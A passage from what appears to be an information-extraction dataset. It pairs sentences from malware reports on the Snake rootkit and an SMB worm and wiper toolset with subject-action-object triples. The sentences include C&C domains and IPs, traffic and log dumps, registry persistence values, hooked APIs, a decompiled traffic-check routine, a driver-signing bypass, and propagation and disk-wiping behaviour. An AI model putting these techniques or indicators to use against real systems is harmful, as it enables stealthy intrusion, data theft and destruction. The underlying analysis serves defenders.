192.168.202.131     HTTP 330 HTTP/1.1 200 OK (text/html)\n \u2193\n137   50.536285000   192.168.202.131      31.170.161.136      HTTP     220    GET /D/77568289 HTTP/1.1\n139   50.762073000   31.170.161.136       192.168.202.131     HTTP     474    HTTP/1.1 302 Found (text/html)\n147   51.101706000   192.168.202.131      31.170.164.249      HTTP     217    GET /? HTTP/1.1\n154   51.548661000   192.168.202.131      83.125.22.197       HTTP     225    GET /D/77568289 HTTP/1.1\n163   52.014730000   192.168.202.131      83.125.22.197       HTTP     225    GET /D/77568289 HTTP/1.1\n165   52.637958000   83.125.22.197        192.168.202.131     HTTP     679    HTTP/1.1 200 OK (text/html)\n</table>   \u2193\n<heading>Received command</heading>\nThe domain names of the C&C servers it relies on are hard-coded in the body of the malware": [{"relies on": {"A": "relies on", "S": "it", "O": ["The domain names of the C&C servers"]}}], "\n\nThe ZwReadFile() hook handler will block access to the home directory where the rootkit keeps its file": [{"block": {"A": "block", "S": "The ZwReadFile() hook handler", "O": ["access to the home directory where the rootkit keeps its file"]}}], "\n\n\nThe data that the driver intercepts, along with the important notifications, is passed to the userland DLL to be processed": [{"intercepts": {"A": "intercepts", "S": "the driver", "O": ["The data"]}}], " In order to switch into that mode, a dedicated thread is spawned to listen for IPC\nmessages received through the pipes": [{"is spawned": {"A": "is spawned", "O": ["a dedicated thread"]}}, {"listen": {"A": "listen", "O": ["for IPC messages received through the pipes"]}}], "\n</list>\nAfter that, the malware connects to the new C&C, asking it for another command:\n<list>\n    03:52:13 1400: Connect marketplace.servehttp.com                              type(0)..": [{"asking": {"A": "asking", "S": "the malware", "O": ["for another command"]}, "connects": {"A": "connects", "S": "the malware", "O": ["to the new C&C"]}}, {}], "\n\nIn the first model, the network communications are carried out from the userland - i.e": [{"are carried out": {"A": "are carried out", "O": ["from the userland", "the network communications"]}}], "\n\nTo delegate different types of tasks, the clients send messages to the pipe server using the following task identification headers:\n<list>\n    \u2022\t   DATA\n    \u2022\t   CREATE\n    \u2022\t   CMD\n    \u2022\t   POST\n    \u2022\t   GET\n    \u2022\t   DEL\n    \u2022\t   REGISTR\n    \u2022\t   COPY\n</list>\nThe usermode component of Snake communicates with its kernel-mode driver via a device called \\\\.\\vstor32 (created under\nkernel as \\Device\\vstor32)": [{"communicates": {"A": "communicates", "S": "The usermode component of Snake", "O": ["via a device called \\\\.\\vstor32 (created under kernel as \\Device\\vstor32)", "with its kernel-mode driver"]}}, {"send": {"A": "send", "S": "the clients", "O": ["messages", "using the following task identification headers", "to the pipe server"]}}], "\n\nFor example, the virtual partitions are used by kernel-centric Snake variants, where the kernel-mode driver is responsible for the\ncommunications": [{"is": {"A": "is", "S": "the kernel-mode driver", "O": ["responsible for the communications"]}}], " To do that, the dropper first copies itself as:\n<list>\n     %windows%\\$NtUninstallQ817473$\\fdisk_mon.exe\n</list>\nThe dropper then registers itself as a service to ensure it starts every time Windows is booted, by creating the values:\n<list>\n     ErrorControl = 0\n     Type = 16\n     Start = 2\n     ImagePath = \u201d%SystemRoot%\\$NtUninstallQ817473$\\fdisk_mon.exe\n     ObjectName = \u201dLocalSystem\u201d\n     WOW64 = 1\n\nin the registry key:\n\n     HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Ultra3\n</list>\nNow comes the most interesting part: does the dropper manage to load its 64-bit unsigned driver under 64-bit versions of Windows\nVista and later versions, such as 64-bit Windows 7/8? The answer: Yes, it does": [{"copies": {"A": "copies", "S": "the dropper", "O": ["itself"]}}, {"registers": {"A": "registers", "S": "The dropper", "O": ["as a service", "itself"]}, "ensure": {"A": "ensure", "S": "The dropper", "O": ["it starts every time Windows is booted"]}}], " Once executed, the dropper\ninstalls the kernel mode driver in a pre-defined location": [{"installs": {"A": "installs", "S": "the dropper", "O": ["in a pre-defined location", "the kernel mode driver"]}}, {"executed": {"A": "executed", "O": ["the dropper"]}}], " As demonstrated, the backdoor commands allow Snake to provide remote attackers with full remote access to the\ncompromised system": [{"provide": {"A": "provide", "S": "Snake", "O": ["remote attackers", "with full remote access to the compromised system"]}}, {"allow": {"A": "allow", "S": "the backdoor commands", "O": ["Snake"]}}], "\n</figure>\n\n The ability to keep its data on TrueCrypt-like volumes provides Snake with a powerful ability to exchange data with the usermode\n DLL, as these volumes are accessible both from usermode and kernel mode": [{"keep": {"A": "keep", "S": "Snake", "O": ["on TrueCrypt-like volumes", "its data"]}}], " This way it intercepts all requests along with their\nparameters via IRP (IO request package) hooks": [{"intercepts": {"A": "intercepts", "S": "it", "O": ["via IRP (IO request package) hooks", "all requests along with their parameters"]}}], "\n\nThe driver is registered with NdisIMRegisterLayeredMiniport() API": [{"is registered": {"A": "is registered", "O": ["The driver", "with NdisIMRegisterLayeredMiniport() API"]}}], "\n\nAs soon as the tool made its first GET requests, the driver immediately injected a malicious DLL module in it, and that module\nstarted producing the following traffic:\n<table>\nNo": [{"injected": {"A": "injected", "S": "the driver", "O": ["in it", "a malicious DLL module"]}}, {"started": {"A": "started", "S": "that module", "O": ["producing the following traffic"]}}], " In one example, the rootkit blocks access to registry entries that contain the strings \u201cUltra3\u201d and \u201c~ROOT\u201d": [{"blocks": {"A": "blocks", "S": "the rootkit", "O": ["access to registry entries that contain the strings \u201cUltra3\u201d and \u201c~ROOT\u201d"]}}], "\n\n\nIf the rootkit detects that the OS version is pre-Vista (e.g": [{"detects": {"A": "detects", "S": "the rootkit", "O": ["that the OS version is pre-Vista (e.g. Windows XP) or Windows Server 2008 (e.g. Windows Server 2003)"]}}], "\n   \u2022\t   In the third mode, it works in the \u2018pipe server\u2019 mode, when it passes the web requests it is interested in (as a client) to the\n        pipe server that runs within Windows Explorer (explorer.exe) and/or Internet Explorer (iexplore.exe) processes": [{"works": {"A": "works", "S": "it", "O": ["in the \u2018pipe server\u2019 mode"]}}, {"passes": {"A": "passes", "S": "it", "O": ["the web requests it is interested in (as a client)", "to the pipe server that runs within Windows Explorer (explorer.exe) and/or Internet Explorer (iexplore.exe) processes"]}}], "\n\nThe delivery mechanism is not known: it may be distributed via a thumb-drive, a phishing email attachment, or be delivered via an\nexploit across the network (e.g": [{"be distributed": {"A": "be distributed", "O": ["via a phishing email attachment", "it"]}, "be delivered": {"A": "be delivered", "O": ["it", "via an exploit across the network"]}}], "\n\n\n\n<footer>                                                         BAE Systems Applied Intelligence: Snake Rootkit Report 2014         12</footer>\n\n\fThe reason behind the pipes usage is to \u2018legitimise\u2019 the outbound web requests, forcing them to originate from the host firewall-\nfriendly system services": [{"\u2018legitimise\u2019": {"A": "\u2018legitimise\u2019", "S": "the pipes usage", "O": ["the outbound web requests"]}}], "\n\n\n</section>\n<section>\n<heading>\nSYSTEM HOOKS</heading>\nThe first API it hooks is IoCreateDevice()": [{"hooks": {"A": "hooks", "S": "it", "O": ["IoCreateDevice()"]}}], "\n\n    4      Once the task of communication with C&C is delegated to the pipe server, it will start communicating with the C&C,\n\n          bypassing the host-based firewalls that keep an infected system process in a white-list": [{"start": {"A": "start", "S": "it", "O": ["communicating with the C&C"]}}, {"bypassing": {"A": "bypassing", "O": ["the host-based firewalls that keep an infected system process in a white-list"]}}, {"is delegated": {"A": "is delegated", "O": ["the task of communication with C&C", "to the pipe server"]}}], "\n\nIn order to be able to perform the steps above, the dropper must first obtain Administrator privileges": [{"obtain": {"A": "obtain", "S": "the dropper", "O": ["Administrator privileges"]}}], "\n\nThe logs and dumps it creates on the hidden virtual volumes contributes to its stealthiness too": [{"creates": {"A": "creates", "S": "it", "O": ["on the hidden virtual volumes", "The logs and dumps"]}}], "\n   \u2022\t   In the second mode, it uses Windows Sockets 2 (Winsock) APIs, such as WSAStartup(), socket(), connect(),\n        send(), etc": [{"uses": {"A": "uses", "S": "it", "O": ["Windows Sockets 2 (Winsock) APIs, such as WSAStartup(), socket(), connect(), send(), etc"]}}], " We have identified two distinct variants, both highly flexible but with two\ndifferent techniques for establishing and maintaining a presence on the target system": [{"establishing and maintaining": {"A": "establishing and maintaining", "S": "two distinct variants", "O": ["a presence", "on the target system"]}}], "\n</section>\n<footer>                                                         BAE Systems Applied Intelligence: Snake Rootkit Report 2014           13</footer>\n\n\f\n<section>\n<heading>KERNEL-CENTRIC ARCHITECTURE</heading>\nThis particular architecture relies on a kernel-mode driver to carry out the network communications": [{"carry out": {"A": "carry out", "S": "a kernel-mode driver", "O": ["the network communications"]}}], "\nWhen that happens, NDIS invokes Snake\u2019s hook function\n(ProtocolReceiveNetBufferLists) to process the\nreceived data": [{"invokes": {"A": "invokes", "S": "NDIS", "O": ["Snake\u2019s hook function"]}}], " On a 32-bit OS, it will install a 32-bit driver": [{"install": {"A": "install", "S": "it", "O": ["On a 32-bit OS", "a 32-bit driver"]}}], " OK\n    03:52:17 652: GET test file /IMAGE/pub.html\n    03:52:17 652: POST /IMAGE/2/55198739672286404661840843638320033\n    03:52:18 652: C:\\WINDOWS\\$NtUninstallQ812589$\\gstat32.bin 310[B]\n    03:52:19 652: Http Status:200\n    03:52:19 652: POST /IMAGE/2/32773318678423920155243775957661252\n    03:52:19 652: result.xml 1278[B]\n    03:52:20 652: Http Status:200\n    03:52:21 652: POST /IMAGE/2/41535327538451061594793127961089611\n    03:52:21 652: C:\\WINDOWS\\$NtUninstallQ812589$\\mtmon32.sdb 655[B]\n    03:52:22 652: Http Status:200\n    03:52:22 652: POST /IMAGE/2/35192812459183876172895945534862460\n    03:52:22 652: C:\\WINDOWS\\$NtUninstallQ812589$\\mtmon.sdb 748[B]\n    03:52:23 652: Http Status:200\n</list>\nThe files it uploads are stored inside its home directory %windows%\\$NtUninstallQ[random]$,\nwhere [random] is a random number": [{"uploads": {"A": "uploads", "S": "it", "O": ["The files"]}}], " It is designed to perform the high-level tasks\nsuch as:\n<list>\n   \u2022\t     manage the configuration data (by using a queue)\n   \u2022\t     exfiltrate data by using Windows Internet (WinINet) APIs or Windows Sockets 2 (Winsock) APIs:\n           \u2022\t   communicate with the C&C server and receive commands to execute\n           \u2022\t   submit logs to the C&C server and other reports\n</list>\nWhen the DLL activates, it reads configuration parameters from the configuration queue, that the driver creates on a virtual volume": [{"creates": {"A": "creates", "S": "the driver", "O": ["the configuration queue", "on a virtual volume"]}, "reads": {"A": "reads", "S": "it", "O": ["configuration parameters", "from the configuration queue"]}}, {"activates": {"A": "activates", "S": "the DLL"}}], "\n\n    3      In the \u2018pipe mode\u2019 of operation, the injected DLL will start communicating with the pipe server by sending messages into\n         the established inter-process communication pipes": [{"start": {"A": "start", "S": "the injected DLL", "O": ["communicating with the pipe server"]}, "sending": {"A": "sending", "S": "the injected DLL", "O": ["messages", "into the established inter-process communication pipes"]}}], " Other resources embedded within the dropper are the 32-bit and 64-bit builds of its driver, a tool for\ncreating NTFS file systems, and the initial message queue file which is written into the virtual volume": [{"is written": {"A": "is written", "O": ["the initial message queue file", "into the virtual volume"]}}, {"creating": {"A": "creating", "S": "a tool", "O": ["NTFS file systems"]}}], " Another\napproach is to carry out all of the communications from the kernel-mode driver, which is a very challenging task by itself": [{"carry out": {"A": "carry out", "O": ["all of the communications", "from the kernel-mode driver"]}}], " When that happens, the\nrootkit triggers an event named \\BaseNamedObjects\\wininet_activate": [{"triggers": {"A": "triggers", "S": "the rootkit", "O": ["an event named \\BaseNamedObjects\\wininet_activate"]}}], " The installed hook handler calls the original API and then checks if the name of the\ndevice is netbt or afd": [{"checks": {"A": "checks", "S": "The installed hook handler", "O": ["if the name of the device is netbt or afd"]}, "calls": {"A": "calls", "S": "The installed hook handler", "O": ["the original API"]}}], " Its ability to generate malicious traffic whenever the user\ngoes online and start loading the web pages allows it to \u2018blend in\u2019 with the legitimate communications": [{"\u2018blend in\u2019": {"A": "\u2018blend in\u2019", "S": "it", "O": ["with the legitimate communications"]}, "generate": {"A": "generate", "S": "it", "O": ["malicious traffic", "whenever the user goes online and start loading the web pages"]}}], " kbdfaori.dll), log directory, and the registry entry ShellCore that stores other configuration details:\n\n         03:52:02 TVer=1.2\n         03:52:02 Parent:C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\n         03:52:02 ver 3.2.0.0a inj             dll K:0      PID:712,\n         C:\\WINDOWS\\system32\\kbdfaori.dll,\n         hostID:ea5cfa5ea1681bd6(16887647987074341846)\n         03:52:02 C:\\WINDOWS\\$NtUninstallQ812589$,\n         Temp:C:\\WINDOWS\\$NtUninstallQ812589$\\SPUNINST\\Temp\n         03:52:02 REG:Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n         03:52:02 ModuleStart: 03:51:42\n\n   \u2022\t scmp.bin - pipe server log that shows its assigned name (COMPUTERNAME is the name of the test system) and\n      what processes it operates from:\n\n         02:04:24 TVer=1.6\n         02:04:24 SPCOMPUTERNAME: Pipe server thread start\n         02:04:24 Inj[1620]:explorer.exe\n         03:51:42 Inj[712]:iexplore.exe\n\n    \u2022\t ucmp.bin - another pipe server log:\n\n         02:04:44 TVer=1.6\n         02:04:44 UPCOMPUTERNAME: Pipe server thread start\n</list>\n\n</section>\n\n<footer>                                                        BAE Systems Applied Intelligence: Snake Rootkit Report 2014    11</footer>\n\n\f\n<section>\n<heading>INTER-PROCESS COMMUNICATION</heading>\nAnalysis of the sample reveals that it supports 3 modes of fetching C&C commands": [{"supports": {"A": "supports", "S": "it", "O": ["3 modes of fetching C&C commands"]}}], "\n\nIn order to accomplish it, it registers a callout driver for Windows Filtering Platform (WFP), an architecture first introduced with\nWindows Vista and nowadays normally used by antivirus and/or intrusion detection systems to inspect/block malicious traffic": [{"registers": {"A": "registers", "S": "it", "O": ["a callout driver for Windows Filtering Platform (WFP)"]}}], "\n\nIn both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes": [{"injected": {"A": "injected", "S": "the driver", "O": ["a usermode DLL", "into the system processes"]}}, {"installed": {"A": "installed", "O": ["a kernel mode driver"]}}], " Windows Server 2003), it will\ninvoke FwpsStreamInjectAsync0() API in order to generate outbound requests": [{"invoke": {"A": "invoke", "S": "it", "O": ["FwpsStreamInjectAsync0() API"]}, "generate": {"A": "generate", "S": "it", "O": ["outbound requests"]}}], " It is designed to covertly install a backdoor on a compromised system, hide the presence of its\ncomponents, provide a communication mechanism with its C&C servers, and enable an effective data exfiltration mechanism": [{"provide": {"A": "provide", "S": "It", "O": ["a communication mechanism with its C&C servers"]}, "covertly install": {"A": "covertly install", "S": "It", "O": ["a backdoor", "on a compromised system"]}, "enable": {"A": "enable", "S": "It", "O": ["an effective data exfiltration mechanism"]}, "hide": {"A": "hide", "S": "It", "O": ["the presence of its components"]}}], " When most of the infected hosts are cut off from the outside world, it only needs one host to be\nconnected online": [{"only needs": {"A": "only needs", "S": "it", "O": ["one host to be connected online", "When most of the infected hosts are cut off from the outside world"]}}], " In one of the analysed\nkernel-centric Snake samples the home directory was hard-coded as %windows%\\$NtUninstallQ817473$, so it blocked file\nread access from that directory": [{"blocked": {"A": "blocked", "S": "it", "O": ["file read access from that directory"]}}], "\n\nIf the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking\ncontrol over new hosts, thus repeating the infection cycle all over again and spreading the infection further": [{"replicate": {"A": "replicate", "S": "it", "O": ["the infection", "across the network"]}, "taking control": {"A": "taking control", "S": "it", "O": ["over new hosts"]}, "repeating": {"A": "repeating", "S": "it", "O": ["the infection cycle", "all over again"]}, "spreading": {"A": "spreading", "S": "it", "O": ["the infection", "further"]}}, {"delivers": {"A": "delivers", "S": "the tool", "O": ["the payload"]}, "exploits": {"A": "exploits", "S": "the tool", "O": ["the remote host(s)"]}}], "\n\nThe analysed 32-bit dropper creates a driver in the following location:\n<list>\n%windows%\\$NtUninstallQ817473$\\fdisk.sys\n</list>\nHowever, different samples may use a different path and driver file name": [{"creates": {"A": "creates", "S": "The analysed 32-bit dropper", "O": ["a driver", "in the following location"]}}], " The traffic is then routed through that host to make external control and data exfiltration still possible": [{"make": {"A": "make", "O": ["data exfiltration", "still possible"]}}, {"is then routed": {"A": "is then routed", "O": ["The traffic", "through that host"]}}], "\n</section>\n<footer>                                                       BAE Systems Applied Intelligence: Snake Rootkit Report 2014            23</footer>\n\n\f\n<section>\n<heading>USERMODE DLLS</heading>\nThe usermode DLLs injected by the kernel-mode driver into the userland system process (e.g": [{"injected": {"A": "injected", "S": "the kernel-mode driver", "O": ["into the userland system process", "The usermode DLLs"]}}], " If the\ndata contains commands from C&C, the DLL module is expected to execute them and report results back to the driver to be\ndelivered back to C&C": [{"be delivered": {"A": "be delivered", "S": "the driver", "O": ["back to C&C"]}}, {"execute": {"A": "execute", "S": "the DLL module", "O": ["them", "If the data contains commands from C&C"]}}], "\n\nWhen running in WinPE mode there is no Code Integrity control, therefore by enabling this mode by patching only one bit,\nCode Integrity verification is disabled so that the unsigned 64-bit driver can be loaded": [{"be loaded": {"A": "be loaded", "O": ["the unsigned 64-bit driver"]}}, {"is disabled": {"A": "is disabled", "O": ["Code Integrity verification"]}}], "\n\n\n\n</section>\n<section>\n<heading>\nNDIS HOOKING</heading>\nFor NDIS versions 5.X, Snake rootkit contains code that installs NDIS filter intermediate driver": [{"installs": {"A": "installs", "S": "code", "O": ["NDIS filter intermediate driver"]}}], "\n\n    2      As soon as the driver detects a usermode process that goes online (e.g": [{"detects": {"A": "detects", "S": "the driver", "O": ["a usermode process that goes online (e.g. a browser)"]}}], "\n   03/02/2014        01:57 PM                    210,944 fdisk.sys\n   13/02/2014        04:47 PM              104,857,600 hotfix.dat\n                         2 File(s)          105,068,544 bytes\n                         2 Dir(s)        8,406,433,792 bytes free\n\n</figure>\nAnalysis of the hotfix.dat file contents reveals it\u2019s a fully encrypted file with flat entropy": [{"\u2019s": {"A": "\u2019s", "S": "it", "O": ["a fully encrypted file with flat entropy"]}}], " The data stored in \\\\.\\Hd2 is encrypted the same way the first volume\u2019s data": [{"is encrypted": {"A": "is encrypted", "O": ["The data stored in \\\\.\\Hd2", "the same way the first volume\u2019s data"]}}], "\nThe attacker may then craft an exploit against those hosts, possibly by using the Metasploit framework, and then deliver the\ngenerated shellcode back to the reconnaissance tool to be applied against the identified hosts by running the tool with the\n\u2018exp_os\u2019 switch": [{"deliver": {"A": "deliver", "S": "The attacker", "O": ["to be applied against the identified hosts by running the tool with the \u2018exp_os\u2019 switch", "the generated shellcode", "back to the reconnaissance tool"]}}], " Firstly, the 64-bit unsigned driver file is created as usual:\n<list>\n     %windows%\\$NtUninstallQ817473$\\fdisk.sys\n</list>\nHowever, the driver is not registered; what is registered instead is the dropper itself": [{"is registered": {"A": "is registered", "O": ["the dropper itself"]}}], "\n\nIn order to hide its components, the driver hooks the following APIs:\n<list>\n    \u2022\t ZwQueryKey\n    \u2022\t ZwEnumerateKey\n    \u2022\t ZwCreateKey\n    \u2022\t ZwSaveKey\n    \u2022\t ZwReadFile\n    \u2022\t ZwQuerySystemInformation\n    \u2022\t ZwQueryInformationProcess\n    \u2022\t ZwClose\n    \u2022\t ZwTerminateProcess\n    \u2022\t ZwShutdownSystem\n    \u2022\t ObOpenObjectByName\n</list>\n<footer>                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014           14</footer>\n\fFor example, the hook handlers of the registry-related APIs will block access to the registry entries that contain the name of the\ndriver": [{"block": {"A": "block", "S": "the hook handlers of the registry-related APIs", "O": ["access to the registry entries that contain the name of the driver"]}}, {"hooks": {"A": "hooks", "S": "the driver", "O": ["the following APIs"]}, "hide": {"A": "hide", "S": "the driver", "O": ["its components"]}}], "\n</table>\n\nOnce decrypted, the malware interprets the received command, as reflected in the malware log below (the new C&C server address\nis highlighted in it):\n<list>\n    03:52:12 Del after 0\n    03:52:12 Run instruction: 6 ID:303149772147483647(13:41:34 05/08/2013)\n    03:52:12 Add address &marketplace.servehttp.com&/UPDATE/&cert1024&Un77ko#s&&&\n    03:52:12 Finish run instruction": [{"interprets": {"A": "interprets", "S": "the malware", "O": ["the received command"]}}], " Some examples are given below, and\na full list of known domains is given in the Appendix D:\n<list>\n      \u2022\t north-area.bbsindex.com\n      \u2022\t winter.site11.com\n      \u2022\t swim.onlinewebshop.net\n      \u2022\t july.mypressonline.com\n      \u2022\t toolsthem.xp3.biz\n      \u2022\t softprog.freeoda.com\n      \u2022\t euassociate.6te.net\n</list>\nAs seen in the traffic dump above, the malware first resolves the domain name of its C&C": [{"resolves": {"A": "resolves", "S": "the malware", "O": ["the domain name of its C&C"]}}], " The choice of what architecture should be used may depend on a specific\ntarget\u2019s environment, allowing the Snake operators to choose the most suitable architecture to be deployed": [{"depend on": {"A": "depend on", "S": "The choice of what architecture should be used", "O": ["a specific target\u2019s environment"]}}], "\n\nHere are specific steps:\n<list>\n    \u2022\t   The data it accepts should start from a 10 byte signature with the following rules:\n\n         \u2022\t     the first 8 bytes must all be ASCII characters, the parser calculates their total sum (sum):\n<code>\n                 01         for (int i = 0; i < 8; i++)\n                 02         {\n                 03         \t      if (*(BYTE *)ptrBuffer <= 32 ||\n                 04         \t          *(BYTE *)ptrBuffer >= 128)\n                 05         \t{\n                 06         \t\treturn 0;                                           // if not ASCII, quit\n                 07         \t}\n                 08         \t      sum += *(BYTE *)ptrBuffer;                    // add to sum\n                 09         \t      ++ptrBuffer;                                  // advance buffer pointer\n                 10         }\n</code>\n\n         \u2022\t     9th byte must be equal to sum / 26 + 65\n\n         \u2022\t     10th byte must be equal to 122 - sum % 26\n<code>\n\n                 01         if ((*(BYTE *)ptrBuffer != sum / 26 + 65) ||\n                 02             (*(BYTE *)(ptrBuffer + 1) != 122 - sum % 26))\n                 03         {\n                 04                result = 0;\n                 05         }\n</code>\n   \u2022\t    Starting from the 11th byte, the data must be base64-encoded; the parser decodes that data\n<code>\n           01          base_64_decode(abyBuffer + 10,\n           02                         &ptrDecoded,\n           03                         iMaxLength - 10);\n</code>\n\n    \u2022\t   Once decoded, the decrypted data should contain the aforementioned markers:\n<figure>\n          .text:F6751426              lea          eax, [ebp+dwMarker]                            ; return marker here\n          .text:F6751429              push         eax\n          .text:F675142A              mov          ecx, [ebp+buf_len]                             ; traffic\u2019s buffer length\n          .text:F675142D              push         ecx\n          .text:F675142E              mov          edx, [ebp+abyBuffer]                           ; traffic\u2019s buffer pointer\n          .text:F6751431              push         edx\n          .text:F6751432              call         decrypt_traffic                                ; decrypt traffic first\n          .text:F6751437              test         eax, eax\n          .text:F6751439              jz           short exit                                     ;   if failed, exit\n          .text:F675143B              mov          eax, [ebp+dwMarker]                            ;   check the returned marker\n          .text:F675143E              cmp          eax, _DEADBEAF                                 ;   _DEADBEAF dd 0DEADBEAFh\n          .text:F6751444              jnz          short exit                                     ;   if not 0xDEADBEAF, exit\n          .text:F6751446              cmp          [ebp+dwNextDword], 0C001BA5Eh                  ;   check next DWORD\n          .text:F675144D              jnz          short next                                     ;   if not 0xC001BA5E, exit\n</figure>\n\n   \u2022\t    When the traffic is authenticated, its contents is then parsed by using \u201cGET\u201d, \u201cPOST\u201d, \u201chttp://\u201d, \u201cHTTP/\u201d,\n         \u201cContent-Length\u201d, \u201cConnection\u201d, \u201cclose\u201d tags, in order to retrieve HTTP requests\n\n   \u2022\t    SMTP traffic is also parsed, only by using \u201cMAIL \u201c, \u201cRCPT \u201c tags in order to retrieve SMTP characteristics\n</list>\n\n\n         <footer>                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014   18</footer>\n\fBy observing such behaviour, one might wonder why the driver is expecting HTTP or SMTP clients? Why does it act like HTTP/SMTP\nserver processing client traffic, and serving back normal responses as per the protocol?\n\nFor example, in HTTP the driver will respond with messages like \u201cHTTP/1.1 200 OK\u201d or \u201cHTTP/1.1 500 Server Error\u201d": [{"respond": {"A": "respond", "S": "the driver", "O": ["with messages like \u201cHTTP/1.1 200 OK\u201d or \u201cHTTP/1.1 500 Server Error\u201d"]}}], " If the device name is Null, Beep, tcpip or Nsiproxy, it will activate\nitself by enabling its hooks designed to hide the presence of Snake on a system, set up its access control lists and the messaging\nsystem": [{"hide": {"A": "hide", "S": "its hooks", "O": ["the presence of Snake on a system"]}}], "\nWhen the dropper file was executed, it started a second instance of itself with \u201c-i\u201d as an argument, and then terminated": [{"started": {"A": "started", "S": "it", "O": ["with \u201c-i\u201d as an argument", "a second instance of itself"]}, "terminated": {"A": "terminated", "S": "it"}}, {"was executed": {"A": "was executed", "O": ["the dropper file"]}}], " This further results in the\nvictim machine being non-operational with irrecoverable data": [{"results in": {"A": "results in", "S": "This", "O": ["the victim machine being non-operational with irrecoverable data"]}}], " This SMB Worm Tool is equipped with a Listening Implant, Lightweight Backdoor, Proxy Tool,\nDestructive Hard Drive Tool, and Destructive Target Cleaning Tool": [{"is equipped": {"A": "is equipped", "O": ["This SMB Worm Tool", "with Lightweight Backdoor"]}}], " The tool is dropped and installed by another\nexecutable and consists of three parts: an executable and a dll which contain the destructive components, and an encoded command file that contains the actual\ndestruction commands to be executed": [{"contain": {"A": "contain", "S": "an executable and a dll", "O": ["the destructive components"]}}, {"is dropped and installed": {"A": "is dropped and installed", "S": "another executable", "O": ["The tool"]}}, {"contains": {"A": "contains", "S": "an encoded command file", "O": ["the actual destruction commands to be executed"]}}], " If \u201cigfxtrayex.exe\u201d is run with no parameters, it creates and starts a copy of itself with\nthe \u201c\u2013i\u201d argument": [{"starts": {"A": "starts", "S": "it", "O": ["with the \u201c\u2013i\u201d argument"]}, "creates": {"A": "creates", "S": "it"}}], " There are two main threads: the first thread calls home and sends back logs (a list of successful SMB exploitations), and the second thread\nattempts to guess passwords for SMB connections": [{"calls": {"A": "calls", "S": "the first thread", "O": ["home"]}, "sends": {"A": "sends", "S": "the first thread", "O": ["back logs (a list of successful SMB exploitations)"]}}, {"guess": {"A": "guess", "S": "the second thread", "O": ["for SMB connections", "passwords"]}}], " Upon initial connection, the victim sends the string, \"HTTP/1.1 GET /dns?\n\\x00.\" The controller then responds with the string \"200 www.yahoo.com!\\x00\" (for \"sensvc.exe\" and \"msensvc.exe\") or with the string \"RESPONSE 200 OK!!\" (for\n\"netcfg.dll\")": [{"sends": {"A": "sends", "S": "the victim", "O": ["the string, \"HTTP/1.1 GET /dns? \\x00.\""]}}, {"responds": {"A": "responds", "S": "The controller", "O": ["with the string \"200 www.yahoo.com!\\x00\" (for \"sensvc.exe\" and \"msensvc.exe\")", "with the string \"RESPONSE 200 OK!!\" (for \"netcfg.dll\")"]}}], " This\ntool includes functionality to open ports in a victim host's firewall and take advantage of universal Plug and Play (UPNP) mechanisms to discover routers and\ngateway devices, and add port mappings, allowing inbound connections to victim hosts on Network Address Translated (NAT) private networks": [{"discover": {"A": "discover", "S": "This tool", "O": ["routers and gateway devices"]}, "allowing": {"A": "allowing", "S": "This tool", "O": ["on Network Address Translated (NAT) private networks", "inbound connections", "to victim hosts"]}, "add": {"A": "add", "S": "This tool", "O": ["port mappings"]}, "open": {"A": "open", "S": "This tool", "O": ["in a victim host's firewall", "ports"]}}], " This proxy tool has basic backdoor functionality, including the ability to fingerprint the\nvictim machine, run remote commands, perform directory listings, perform process listings, and transfer files": [{"perform": {"A": "perform", "S": "This proxy tool", "O": ["directory listings"]}, "fingerprint": {"A": "fingerprint", "S": "This proxy tool", "O": ["the victim machine"]}, "transfer": {"A": "transfer", "S": "This proxy tool", "O": ["files"]}, "has": {"A": "has", "S": "This proxy tool", "O": ["basic backdoor functionality"]}, "run": {"A": "run", "S": "This proxy tool", "O": ["remote commands"]}}], "\n\nDestructive Target Cleaning Tool: This tool renders victim machines inoperable by overwriting the Master Boot Record": [{"overwriting": {"A": "overwriting", "S": "This tool", "O": ["the Master Boot Record"]}, "renders": {"A": "renders", "S": "This tool", "O": ["inoperable", "victim machines"]}}], "\n\nNetwork Propagation Wiper: The malware has the ability to propagate throughout the target network via built-in Windows shares": [{"propagate": {"A": "propagate", "S": "The malware", "O": ["throughout the target network", "via built-in Windows shares"]}}], " Once the wiper has been uploaded, the malware reports its status back to one of\nthe four C2 IP addresses": [{"reports": {"A": "reports", "S": "the malware", "O": ["its status", "back to one of the four C2 IP addresses"]}, "been uploaded": {"A": "been uploaded", "S": "the malware", "O": ["the wiper"]}}], "\n\nThe SMB worm propagates throughout an infected network via brute-force authentication attacks, and connects to a C2 infrastructure": [{"connects": {"A": "connects", "S": "The SMB worm", "O": ["to a C2 infrastructure"]}, "propagates": {"A": "propagates", "S": "The SMB worm", "O": ["via brute-force authentication attacks", "throughout an infected network"]}}], " The \u201c-s\u201d instance dropped and executed\n\u201cigfxtrayex.exe\u201d, created \u201cnet_ver.dat\u201d, and began generating network traffic over TCP ports 445 and 139 to victim IP addresses": [{"generating": {"A": "generating", "S": "The \u201c-s\u201d instance", "O": ["network traffic", "to victim IP addresses", "over TCP ports 445 and 139"]}, "executed": {"A": "executed", "S": "The \u201c-s\u201d instance", "O": ["\u201cigfxtrayex.exe\u201d"]}, "created": {"A": "created", "S": "The \u201c-s\u201d instance", "O": ["\u201cnet_ver.dat\u201d"]}, "dropped": {"A": "dropped", "S": "The \u201c-s\u201d instance", "O": ["\u201cigfxtrayex.exe\u201d"]}}], " It is dropped from resource ID 0x83 of \u201cigfxtrayex.exe\u201d": [{"is dropped": {"A": "is dropped", "O": ["It", "from resource ID 0x83 of \u201cigfxtrayex.exe\u201d"]}}], " It includes functionality such as file transfer, system survey, process\nmanipulation, file time matching and proxy capability": [{"includes": {"A": "includes", "S": "It", "O": ["system survey"]}}], " If the password is correctly guessed, a file share is established and file is copied and run on the newly-infected\nhost": [{"is established": {"A": "is established", "O": ["a file share"]}}, {"is copied": {"A": "is copied", "O": ["file", "on run file"]}, "run": {"A": "run", "O": ["file", "on is copied file"]}}], "\n\nProxy Tool: Implants in this malware family are typically loaded via a dropper installed as a service, then configured to listen on TCP port 443": [{"installed": {"A": "installed", "O": ["as a service", "a dropper"]}, "are typically loaded": {"A": "are typically loaded", "O": ["via a dropper", 